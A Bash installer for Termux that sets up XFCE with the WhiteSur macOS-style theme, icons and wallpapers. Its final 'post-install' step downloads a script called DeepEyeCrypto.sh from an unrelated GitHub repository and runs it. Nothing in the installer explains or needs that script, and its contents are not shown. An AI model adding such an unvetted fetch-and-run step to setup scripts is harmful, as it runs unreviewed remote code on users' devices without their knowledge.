#!/bin/bash

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

# Configuration
THEME_NAME="WhiteSur-dark"
THEME_DIR="$HOME/.themes"
ICON_DIR="$HOME/.icons"
WALLPAPER_DIR="$HOME/.local/share/backgrounds/xfce"
TEMP_DIR="/tmp/xfce-install"

# Error handling
set -e

print_status() {
    echo -e "${CYAN}[+]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

# Initial setup
echo -e "${GREEN}=== XFCE Desktop Environment Installer ===${NC}"

# Phase 1: System update
print_status "Updating system packages"
pkg update -y && pkg upgrade -y
termux-setup-storage

# Phase 2: Core installation
print_status "Installing XFCE components"
pkg install -y x11-repo termux-x11-nightly pulseaudio xfce4 \
    tur-repo firefox code-oss chromium git wget

# Phase 3: Theming setup
print_status "Configuring desktop theme"
pkg install -y meson sassc gnome-themes-extra
mkdir -p {$THEME_DIR,$ICON_DIR,$WALLPAPER_DIR,$TEMP_DIR}

# Install WhiteSur Theme
print_status "Installing GTK Theme"
git clone https://github.com/vinceliuice/WhiteSur-gtk-theme $TEMP_DIR/gtk-theme
cd $TEMP_DIR/gtk-theme
./install.sh -t all -c dark -C -N -o --xdg-home

# Install WhiteSur Icons
print_status "Installing Icon Pack"
git clone https://github.com/vinceliuice/WhiteSur-icon-theme $TEMP_DIR/icon-theme
cd $TEMP_DIR/icon-theme
./install.sh --black --xdg-home

# Install Wallpapers
print_status "Setting up wallpapers"
git clone https://github.com/vinceliuice/WhiteSur-wallpapers $TEMP_DIR/wallpapers
cd $TEMP_DIR/wallpapers
./install.sh --xdg-home

# Additional wallpapers
declare -a EXTRA_WALLPAPERS=(
    "https://4kwallpapers.com/images/wallpapers/macos-big-sur-apple-layers-fluidic-colorful-wwdc-stock-4096x2304-1455.jpg"
    "https://4kwallpapers.com/images/wallpapers/macos-fusion-8k-7680x4320-12482.jpg"
    "https://4kwallpapers.com/images/wallpapers/macos-sonoma-6016x6016-11577.jpeg"
    "https://4kwallpapers.com/images/wallpapers/macos-sonoma-6016x6016-11576.jpeg"
    "https://4kwallpapers.com/images/wallpapers/sierra-nevada-mountains-macos-high-sierra-mountain-range-5120x2880-8674.jpg"
)
for url in "${EXTRA_WALLPAPERS[@]}"; do
    wget -q --show-progress -P $WALLPAPER_DIR "$url"
done

# Apply theme settings
print_status "Finalizing desktop configuration"
xfconf-query -c xsettings -p /Net/ThemeName -s "$THEME_NAME"
xfconf-query -c xsettings -p /Net/IconThemeName -s "$THEME_NAME"
xfconf-query -c xfwm4 -p /general/theme -s "$THEME_NAME"
xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image \
    -s "$WALLPAPER_DIR/macos-big-sur-apple-layers-fluidic-colorful-wwdc-stock-4096x2304-1455.jpg"

# Phase 4: Final steps
print_status "Running post-install scripts"
cd ~
wget -q https://github.com/DeepEyeCrypto/DeepEyeCrypto/raw/main/DeepEyeCrypto.sh
chmod +x DeepEyeCrypto.sh
bash DeepEyeCrypto.sh

# Cleanup
rm -rf $TEMP_DIR

print_success "Installation completed!"
echo -e "${YELLOW}Start XFCE with these commands:"
echo -e "termux-x11 &"
echo -e "xfce4-session${NC}"
